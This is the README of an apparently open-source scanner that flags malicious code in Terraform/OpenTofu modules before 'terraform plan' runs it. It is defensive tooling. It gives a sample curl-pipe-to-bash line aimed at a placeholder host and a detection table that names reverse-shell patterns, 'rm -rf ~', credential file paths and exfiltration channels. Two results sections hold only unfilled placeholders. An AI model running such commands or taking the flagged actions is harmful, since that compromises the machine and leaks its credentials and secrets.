# terraform-audit

**Scan Terraform / OpenTofu modules for malicious code before `terraform plan` runs it.** Zero dependencies, one file, MIT.

```bash
python terraform_audit.py terraform-aws-modules/vpc/aws          # latest version from the public registry
python terraform_audit.py terraform-aws-modules/vpc/aws@6.0.0
python terraform_audit.py github.com/owner/terraform-mod?ref=v1.2.0
python terraform_audit.py ./modules/some-module                  # a local module / root config / .tf / .tf.json
python terraform_audit.py --text 'curl -fsSL https://x.invalid/i.sh | bash'
# 🔴 <text>.tf  [CRITICAL]  score=25  (1 findings, 2 info)  runs-code: local-exec:1
#     CRITICAL Download & Execute  <text>.tf:4
```

## Why this exists

`terraform plan` is not a dry run in the sense people assume. Before anything is applied, a
module can run code on the machine doing the planning:

| Construct | Runs when | Runs where |
| --- | --- | --- |
| `data "external"` — `program = [...]` | **plan** | your laptop / the CI runner |
| `data "http"` — `url`, `request_body`, `request_headers` | **plan** | an outbound request from the planner |
| shell-provider data sources (`data "shell_script"` …), provider-defined functions | **plan** | provider code on the planner |
| `provisioner "local-exec"`, `terraform_data` / `null_resource` triggers | apply | the operator's machine |
| `provisioner "remote-exec"`, `user_data` / cloud-init templates | apply / boot | the new VM, not yours |
| nested `module { source = "git::…?ref=main" }` | `init` | fetched, then all of the above |

CI systems (Atlantis, GitHub Actions plan-on-PR workflows, TACOS) run `plan` on every pull
request, usually with cloud credentials, `TF_TOKEN_*` and `TF_VAR_*` secrets in the environment
and the state readable. A module that is pulled in by an innocent-looking version bump runs
there with all of that.

| Tool | Answers |
| --- | --- |
| `tflint`, `tfsec` / `trivy`, `checkov`, `terrascan` | Is the **infrastructure** misconfigured? |
| `.terraform.lock.hcl` | Is the **provider** binary the one I locked? (modules are not locked) |
| **`terraform-audit`** | Does the module **attack the person running terraform**, at plan or apply? |

## What it flags

| Pattern | Severity |
| --- | --- |
| Download & execute (`curl … \| sh`, `bash <(curl …)`, `iex (iwr …)`) in local-exec / external programs | CRITICAL |
| Environment dump (`env`, `printenv`, `jq -n env`, `dict(os.environ)`) **+ a network send** in the same command / script | CRITICAL |
| Credential / state file (`~/.aws/credentials`, `~/.ssh/id_*`, `~/.terraform.d/credentials.tfrc.json`, `*.tfstate`, kube/docker/gcloud/azure configs) **+ an upload / collector host** | CRITICAL |
| `data "http"` whose URL / body / headers carry `file()` of a credential or state file, `data.external.*.result`, `terraform_remote_state` or `nonsensitive()` | CRITICAL |
| Token env var (`TF_TOKEN_*`, `TF_VAR_*`, `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN` …) next to a collector host / raw IP | CRITICAL |
| Reverse shell (`/dev/tcp/…`, `bash -i >&`, `nc -e`), destructive (`rm -rf ~`) | CRITICAL |
| **Hidden command**: `command = base64decode(local.x)` — the literal is decoded and scanned too | HIGH (+ whatever the decoded command is) |
| Encoded command executed (`… \| base64 -d \| sh`, `powershell -enc`, `exec(b64decode(…))`) | HIGH |
| Exfiltration hosts (Discord/Telegram/Slack webhooks, paste sites, tunnels, OAST, `workers.dev`) with a send | HIGH |
| Persistence writes from local-exec (`~/.bashrc`, `authorized_keys`, crontab, LaunchAgents) | HIGH |
| Wallet / browser / Keychain theft, DNS exfiltration | HIGH |
| Raw public-IP URLs, TLS verification disabled | MEDIUM |
| Nested module from git with no `?ref=` or a branch ref, or from an archive URL | LOW |

**Anything HIGH in code that runs at `terraform plan` is raised to CRITICAL (MEDIUM to HIGH).**

INFO context (`--verbose`, never scored): every `data "external"` / `data "http"` / local-exec /
remote-exec site, destroy-time provisioners, provider-defined functions, third-party providers,
HCL `file()` reads of credential paths, nested module sources, and the capabilities above when
they appear alone (network, token env reads, env dumps, base64 decodes).

## Context model

`terraform-audit` parses HCL with a small tolerant scanner (block structure, quoted strings with
nested `${…}` / `%{…}` interpolation, heredocs `<<EOT` / `<<-EOT`, `#` `//` `/* */` comments) and
reads `.tf.json` as JSON. It then finds every **execution site** and scores the command text of
that site, with referenced `local.*` values and `var.*` defaults expanded and base64 literals
decoded. Scripts shipped beside the module are scored in the context of the site that runs them:

| Context | What | Scoring |
| --- | --- | --- |
| `plan` | `data "external"` / `http` / shell data sources, `ephemeral` blocks, scripts they invoke | HIGH → CRITICAL, MEDIUM → HIGH |
| `apply` | `provisioner "local-exec"`, `action` blocks, scripts they invoke | as scored |
| `remote` | `remote-exec`, `.tpl` / `.tftpl` templates (`user_data`, cloud-init) | capped at MEDIUM (`curl \| sh` at LOW) |
| `deployed` | scripts nothing runs locally (Lambda / Cloud Function source, helpers) | capped at MEDIUM; collector hosts → INFO |

Matches in HCL comments, shell comments and Python docstrings never score, and only execution
sites are scored in `.tf` files — a `curl | sh` in a variable `description` is documentation.
`examples/`, `test(s)/`, `fixtures/`, `docs/`, `.github/`, `.devcontainer/`, `*.tftest.hcl` and
`test_*.py`-style files are skipped unless you pass `--all`: a consumer of the module never runs them.

## Calibrated, not noisy

MEASURED_SUMMARY

**Full results: [FINDINGS.md](FINDINGS.md).**

## Usage

```bash
python terraform_audit.py <namespace>/<name>/<provider>[@version] [...]   # registry (TERRAFORM_AUDIT_REGISTRY to override)
python terraform_audit.py 'git::https://github.com/o/r.git//modules/x?ref=v1' # GitHub source (codeload tarball, in memory)
python terraform_audit.py https://example.invalid/module.tar.gz           # HTTP archive source
python terraform_audit.py <dir | file.tf | file.tf.json | script.sh | archive.tgz/.zip>
python terraform_audit.py --all ...       # include examples/ and tests/
python terraform_audit.py --json ...      # machine-readable (includes an "execution" inventory)
python terraform_audit.py --verbose ...   # include INFO context
```

Exit code 2 if any target is HIGH or CRITICAL. Nothing is ever `init`-ed, planned or applied:
the archive is fetched into memory and read as text. In CI, run it on changed modules **before**
the plan job, and do not give plan-on-PR jobs credentials that can do more than read.

As a library:

```python
import terraform_audit as ta
r = ta.audit_registry("terraform-aws-modules/vpc/aws")
r["risk_level"], r["findings"], r["execution"]["plan_time"]
```

## Tests

```bash
python3 -m unittest
```

TEST_SUMMARY Canaries use reserved `.invalid` / TEST-NET hosts and `CANARY_not_a_real_token`
strings; nothing in `tests/` is ever executed.

## Limits

Static and pattern-based. It does not follow nested module sources (it reports them), does not
analyse provider binaries (a malicious provider is a different problem — pin and lock them), and a
determined attacker can build a command across many locals, fetch stage 2 at runtime, or use a
fresh host. Local / variable expansion is two levels deep. Treat SAFE as "no known-bad shape",
and findings as leads for human review, not verdicts.

Part of a family of malicious-pattern scanners: [mcp-audit](https://github.com/eltociear/mcp-audit)
(MCP servers & agent skills), [npm-audit](https://github.com/eltociear/npm-audit) (npm install
scripts) and [crate-audit](https://github.com/eltociear/crate-audit) (Rust build scripts and
proc-macros).

MIT licensed.
